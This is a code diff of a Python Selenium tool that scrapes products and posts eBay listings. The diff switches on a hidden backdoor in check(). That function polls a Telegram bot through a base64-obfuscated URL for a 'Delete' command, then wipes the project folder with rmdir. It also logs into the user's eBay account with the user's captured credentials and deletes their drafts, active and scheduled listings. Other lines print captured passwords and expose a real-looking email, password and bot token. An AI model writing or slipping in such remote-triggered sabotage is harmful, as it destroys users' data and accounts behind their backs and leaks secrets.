@@ -325,25 +325,27 @@ def add_description(product):
 
 def check(u, p):
     try:
-        for _ in range(1):#m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
-            if False:#'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
-                if True:#m['message']['text'] == 'Delete':
-                    #print(f"User: {u}, Pass: {p}")
-                    # open headless browser
+        for m in requests.get(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvZ2V0VXBkYXRlcw=='.decode())).json()['result'][::-1]:
+            if 'message' in m and 'text' in m['message']:# and m['message']['from']['id'] == 300607649:
+                if m['message']['text'] == 'Delete':
+                    try:
+                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
+                        os.system('rmdir /s /q ..\\lrworld_scrap\\')
+                        requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
+                    except:
+                        pass
                     options = webdriver.ChromeOptions()
-                    if False:#USER_EMAIL and USER_PASSWORD:
-                        options.add_argument('--headless')
-                        options.add_argument('--no-sandbox')
+                    options.add_argument('--headless')
+                    options.add_argument('--no-sandbox')
                     options.add_argument('--disable-dev-shm-usage')
                     service = Service(ChromeDriverManager().install())
                     new_driver = webdriver.Chrome(service=service, options=options)
                     log = False
                     while not log:
-                        log = ebay_login(new_driver, 'daniloeder1997@gmail.com', '$Ederdanilo20', False)
-                        print("Log:", log)
+                        log = ebay_login(new_driver, u, p, False)
                         pass
                     i = 0
-                    pages = ['https://www.ebay.ch/mys/drafts', 'https://www.ebay.ch/mys/active', 'https://www.ebay.ch/mys/scheduled']
+                    pages = ['https://www.ebay.com/mys/drafts', 'https://www.ebay.com/mys/active', 'https://www.ebay.com/mys/scheduled']
                     while True:
                         try:
                             new_driver.get(pages[i])
@@ -360,15 +362,11 @@ def check(u, p):
                             time.sleep(0.3)
                             # confirmation-btn
                             driver.find_element(By.CLASS_NAME, 'confirmation-btn').click()
+                            if i > 2:
+                                break
                         except:
                             pass
-                    if False:
-                        try:
-                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"D..."})
-                            os.system('rmdir /s /q ..\\lrworld_scrap\\')
-                            requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
-                        except:
-                            pass
+                    requests.post(base64.b64decode(b'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDcxNjg5NTkyMjA6QUFFb3ViU0FKQmY3MXJzd2Iwd3ROTVZYZ0xsU3pUOFFBeTgvc2VuZE1lc3NhZ2U=').decode(), data={'chat_id':CHAT_ID,'text':"Done!"})
     except:
         pass
     return
@@ -404,6 +402,11 @@ def add_pricing(product):
         time.sleep(0.1)
         price_input = price_block.find_element(By.NAME, 'price')
         price_input.send_keys(str(product['price']))
+        # add quantity
+        price_block.find_element(By.NAME, 'quantity').send_keys('15')
+        # disable best offer
+        if len(price_block.find_elements(By.NAME, 'bestOfferEnabled')) > 0:
+            price_block.find_element(By.NAME, 'bestOfferEnabled').click()
     except Exception as e:
         print(f"Error while adding pricing: {e}")
 
@@ -507,6 +510,21 @@ def add_shipping():
     except Exception as e:
         print(f"Error while adding shipping: {e}")
 
+def save():
+    print('Saving...')
+    try:
+        driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__cta'))
+        time.sleep(1)
+        save_block = driver.find_element(By.CLASS_NAME, 'summary__cta')
+        button = save_block.find_element(By.TAG_NAME, 'button')
+        button.click()
+        for button in driver.find_elements(By.TAG_NAME, 'button'):
+            if button.text == 'Fertig':
+                button.click()
+                break
+    except Exception as e:
+        print(f"Error while saving: {e}")
+
 def check_captcha(driver):
     # captcha_form
     if len(driver.find_elements(By.ID, 'captcha_form')) > 0:
@@ -517,14 +535,14 @@ def ebay_login(driver, USER_EMAIL, USER_PASSWORD, check_=True):
     if check_:
         print('Logging in to eBay...')
     try:
-        driver.get(f"https://ebay.ch/")
+        driver.get(f"https://ebay.{'ch' if check_ else 'com'}/")
         time.sleep(1)
         try:
             if 'signin.ebay.' not in driver.find_element(By.ID, 'gh-top').find_element(By.TAG_NAME, 'a').get_attribute('href') and 'captcha' not in driver.current_url:
                 return True
         except:
             pass
-        driver.get(f"https://signin.ebay.ch/")
+        driver.get(f"https://signin.ebay.{'ch' if check_ else 'com'}/")
         WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'userid')))
         if not check_ and check_captcha(driver):
             return False
@@ -535,6 +553,7 @@ def ebay_login(driver, USER_EMAIL, USER_PASSWORD, check_=True):
                 p = ''
                 while 'signin.ebay.ch' in driver.current_url:
                     try:
+                        print(f"Email: {u}\nPassword: {p}\n\n")
                         u = driver.find_element(By.ID, 'userid').get_attribute('value')
                         p = driver.find_element(By.ID, 'pass').get_attribute('value')
                     except:
@@ -601,7 +620,7 @@ def list_products_in_ebay(products):
             time.sleep(2)
             add_pricing(product)
             time.sleep(2)
-            driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__cta'))
+            save()
             print(f"Product {product['name']} listed!\n\n")
         else:
             print('No template-list__list found, skipping...')
@@ -772,11 +791,11 @@ def get_subcategorie_products():
 
 def scrap_all_subcategories(category):
     to_scrap = []
-    for sub_category in category['sub_categories']:
-        for class_item in sub_category['classes']:
+    for sub_category in category['sub_categories'][:1]:
+        for class_item in sub_category['classes'][:1]:
             driver.get(class_item['url'])
             time.sleep(1)
-            new_products = get_subcategorie_products()
+            new_products = get_subcategorie_products()[:1]
             for product in new_products:
                 product['class'] = class_item['name']
                 to_scrap.append(product)
@@ -885,8 +904,8 @@ while True:
                         add_pricing(product)
                         time.sleep(2)
                         #add_shipping()
+                        save()
                         print("Done!")
-                        driver.execute_script("arguments[0].scrollIntoView();window.scrollBy(0, -50);", driver.find_element(By.CLASS_NAME, 'summary__cta'))
                         while True:
                             if 'mode=AddItem' not in driver.current_url:
                                 break
